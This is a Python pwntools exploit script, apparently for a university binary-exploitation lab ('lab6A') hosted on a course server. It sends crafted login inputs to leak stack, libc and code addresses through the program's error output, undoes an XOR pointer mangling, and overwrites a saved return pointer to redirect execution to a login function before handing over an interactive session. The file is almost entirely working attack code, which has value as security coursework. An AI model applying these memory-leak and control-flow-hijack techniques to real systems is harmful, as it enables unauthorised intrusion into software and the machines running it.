#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn(cond):
    if cond == 1:
        r = process([exe.path])
    elif cond == 2:
        # gdb.attach(r)
        r = gdb.debug([exe.path], gdbscript="""
            b *login_prompt+340
            b *login_prompt+272
            c
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10157)

    return r


def main():
    r = conn(3)

    # user is lab6A
    r.send((b"A"*32).ljust(127, b"\x00"))
    r.send((b"Z"*32).ljust(127, b"\x00"))

    r.recvuntil(b" Authentication failed for user ")
    # good luck pwning :)

    output = r.recvuntil(b"\n")[:-1]
    username = output[:32]
    password = output[32:64]
    output = output[64:]
    first8DW = output[:32]
    first8DW =  bytes([ i^(ord("Z") ^ ord("A"))  for i in first8DW])
    output = output[32:]

    leakLibc = int(first8DW[8:12][::-1].hex(),16)
    leakCode = int(first8DW[12:16][::-1].hex(),16)
    leakSavedEbp = int(first8DW[16:20][::-1].hex(),16)
    leakSavedEip = int(first8DW[20:24][::-1].hex(),16)



    sLeakCode =     0x565eef90
    sLogin =        0x565ec8f6
    offsetToLogin = sLogin - sLeakCode



    print(output, "\n Username: ", username, "\n Password: ",bytes([ i^ord("A")  for i in password]))
    print("Leak first 8 Double Words: ", b"for user ", first8DW)
    print("Leak libc: ", hex(leakLibc))
    print("LeakCode: ", hex(leakCode))
    print("Leak SavedEBP: ", hex(leakSavedEbp))
    print("Leak SavedEIP: ", hex(leakSavedEip))

    leakLogin = leakCode + offsetToLogin
    mangledLogin = leakLogin ^ 0x5A5A5A5A ^ leakSavedEip # and ZZZZ ||||||||||||||| SECALHAR TENHO DE TROCAR O SENTIDO
    print("Leak Login: ", hex(leakLogin), "        Mangled Login: ", hex(mangledLogin))

    r.send((b"A"*32).ljust(127, b"\x00"))
    r.send((b"Z"*20 + p32(mangledLogin) +b"Z"*8).ljust(127, b"\x00"))







    r.recvuntil(b" Authentication failed for user ")

    output = r.recvuntil(b"\n")[:-1]
    username = output[:32]
    password = output[32:64]
    output = output[64:]
    first8DW = output[:32]
    # first8DW =  bytes([ i^(ord("Z") ^ ord("A"))  for i in first8DW])
    output = output[32:]

    leakLibc = int(first8DW[8:12][::-1].hex(),16)
    leakCode = int(first8DW[12:16][::-1].hex(),16)
    leakSavedEbp = int(first8DW[16:20][::-1].hex(),16)
    leakSavedEip = int(first8DW[20:24][::-1].hex(),16)



    print("SECOND LEAK!!!!!!!!!!!!!!!!!!!!!!!")


    print(output, "\n Username: ", username, "\n Password: ",bytes([ i^ord("A")  for i in password]))
    print("Leak first 8 Double Words: ", b"for user ", first8DW)
    print("Leak libc: ", hex(leakLibc))
    print("LeakCode: ", hex(leakCode))
    print("Leak SavedEBP: ", hex(leakSavedEbp))
    print("Leak SavedEIP: ", hex(leakSavedEip))

    r.send((b"A").ljust(127, b"\x00"))
    r.send((b"Z").ljust(127, b"\x00"))

    r.send((b"A").ljust(127, b"\x00"))
    r.send((b"Z").ljust(127, b"\x00"))

    r.send((b"A").ljust(127, b"\x00"))
    r.send((b"Z").ljust(127, b"\x00"))

    r.interactive()


if __name__ == "__main__":
    main()
